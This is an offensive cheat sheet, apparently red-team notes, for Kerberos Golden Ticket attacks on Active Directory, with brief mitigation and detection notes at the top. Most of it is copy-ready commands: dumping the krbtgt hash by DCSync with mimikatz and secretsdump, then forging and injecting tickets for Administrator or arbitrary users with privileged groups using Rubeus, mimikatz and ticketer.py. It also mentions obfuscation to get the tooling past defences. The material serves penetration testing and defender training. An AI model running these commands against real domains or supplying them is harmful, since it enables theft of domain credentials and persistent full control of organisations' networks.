
A Golden Ticket is a forged TGT signed with the hash of the domain's `krbtgt` account. It allows authentication as any user, to any service, across the entire domain.

- [ ] OPSEC

- **Mitigation**: rotate the `krbtgt` password twice on every DC after compromise.
- **Detection**:
  - Look for Event ID 4769 on the DC **without** a preceding 4768, abnormal ticket lifetimes, or incoherent PAC content.
  - Tools such as Mimikatz may generate absurd ticket durations (for example 10 years), which is itself a detection signal.
  - Inconsistent PAC fields such as SIDs, names, or group memberships can stand out.

> In practice, attackers often need obfuscation or bypass work before they can safely run the tooling that forges the ticket.

- [ ] Requirements

```powershell
# 1. FQDN and SID of the current domain (SOURCE.DOMAIN)
ldapsearch (objectClass=domain) --attributes objectSid

# 2. NTLM or AES material for the krbtgt account of SOURCE.DOMAIN
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:domain\krbtgt" "exit"
secretsdump.py source.domain/user@DC_IP:'pass'@DC_IP -just-dc-user domain/krbtgt
```

> When you use `/user:Administrator`, you usually do **not** need `/id`, because Rubeus assumes RID 500 automatically. You also often do **not** need `/groups`, because `Administrator` naturally belongs to the standard privileged groups and Rubeus can populate them in the PAC. If you impersonate a different user, you should specify `/id` and `/groups`. RID `519` exists only in the forest root domain.

- [ ] Golden Ticket Creation: Rubeus

```powershell
# Get domain information (DNS and NetBIOS)
Get-ADDomain -Server source.domain | select DNSRoot,NetBIOSName

# Identify the target domain controller
nltest /dsgetdc:source.domain

# Create a Golden Ticket for Administrator without explicitly setting DC/NetBIOS
.\Rubeus.exe golden /aes256:KRBTGT_HASH_SOURCE_DOMAIN /user:Administrator /domain:SOURCE.DOMAIN /sid:SID_SOURCE_DOMAIN /nowrap /ptt

# Create a Golden Ticket for Administrator with explicit DC and NetBIOS values
.\Rubeus.exe golden /aes256:KRBTGT_HASH_SOURCE_DOMAIN /user:Administrator /domain:SOURCE.DOMAIN /sid:SID_SOURCE_DOMAIN /netbios:NETBIOS_NAME /dc:dc01.source.domain /ptt

# Create a Golden Ticket for an arbitrary user with privileged groups
.\Rubeus.exe golden /user:ada /domain:SOURCE.COM /sid:SID_SOURCE_COM /aes256:KRBTGT_HASH_SOURCE_DOMAIN /id:RID_USER /groups:500,512,518,520 /nowrap /ptt
```

- [ ] Golden Ticket Creation: Mimikatz

```powershell
# HASH NTLM 
.\mimikatz.exe "privilege::debug" "kerberos::golden /user:administrator /domain:SOURCE.DOMAIN /sid:SID_SOURCE_DOMAIN /krbtgt:KRBTGT_HASH_SOURCE_DOMAIN /groups:500,512,518,519,520 /ptt" "exit"

# AES256
.\mimikatz.exe "privilege::debug" "kerberos::golden /user:administrator /domain:SOURCE.DOMAIN /sid:SID_SOURCE_DOMAIN /aes:KRBTGT_HASH_SOURCE_DOMAIN /groups:500,512,518,519,520 /ptt" "exit"

# Another user
.\mimikatz.exe "privilege::debug" "kerberos::golden /user:ada /domain:SOURCE.DOMAIN /sid:SID_SOURCE_DOMAIN /krbtgt:KRBTGT_HASH_SOURCE_DOMAIN /id:RID_USER /groups:500,512,518,519,520 /ptt" "exit"

# Time Based
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:SOURCE.DOMAIN /sid:SID_SOURCE_DOMAIN /krbtgt:KRBTGT_HASH_SOURCE_DOMAIN /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
```

- `/startoffset`: set the time from which the ticket becomes valid.
- `/endin`: set the ticket lifetime in minutes.
- `/renewmax`: set the renewal lifetime in minutes.

- [ ] Golden Ticket Creation: ticketer.py

```bash
# Create the Golden Ticket (ADMINISTRATOR)
ticketer.py -aesKey KRBTGT_AES256_HASH -domain SOURCE.DOMAIN -domain-sid SID_SOURCE_DOMAIN -user Administrator

# Golden Ticket for another user (for example ada)
ticketer.py -aesKey KRBTGT_AES256_HASH -domain SOURCE.DOMAIN -domain-sid SID_SOURCE_DOMAIN -user ada -user-id RID_USER -groups 500,512,518,519,520

# Use the TGT
export KRB5CCNAME=Administrator.ccache

# Request a TGS from your Golden TGT
proxychains kvno cifs/DC01.source.domain

# Confirm
klist
# 18/09/25 22:28:06  16/09/35 22:28:06  krbtgt/SOURCE.DOMAIN@SOURCE.DOMAIN
# 18/09/25 22:33:41  19/09/25 08:33:41  cifs/DC01.source.domain@SOURCE.DOMAIN
```

- `-nthash` = NTLM key material
- `-aesKey` = AES key material
